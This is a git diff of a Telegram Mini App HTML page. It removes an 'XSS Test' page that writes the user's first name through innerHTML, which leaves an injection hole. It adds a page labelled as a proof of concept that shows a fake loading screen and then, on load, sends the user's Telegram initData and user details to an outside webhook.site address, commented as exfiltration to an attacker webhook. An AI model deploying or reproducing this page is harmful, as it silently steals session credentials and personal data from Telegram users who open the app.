@@ -1,19 +1,31 @@
 <!DOCTYPE html>
-<html>
-  <head><title>XSS Test</title></head>
-  <body>
-    <h1>Hello from Mini App</h1>
-    <script>
-      window.addEventListener("DOMContentLoaded", () => {
-        const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
-        if (user?.first_name) {
-          const p = document.createElement("p");
-          p.innerHTML = `Welcome, ${user.first_name}`;
-          document.body.appendChild(p);
-        } else {
-          console.log("[DEBUG] No user or first_name");
-        }
-      });
-    </script>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC: Telegram WebApp initData</title>
+</head>
+<body>
+  <h1>Loading.....</h1>
+  <p>app is opening</p>
+
+  <!-- Load Telegram WebApp SDK -->
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  const initData = Telegram.WebApp.initData;
+  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
+
+  // Log for debug
+  console.log("🔐 Telegram initData:", initData);
+  console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
+
+  // Exfiltrate to attacker webhook
+  fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ initData, initDataUnsafe })
+  });
+</script>
+
+</body>
 </html>
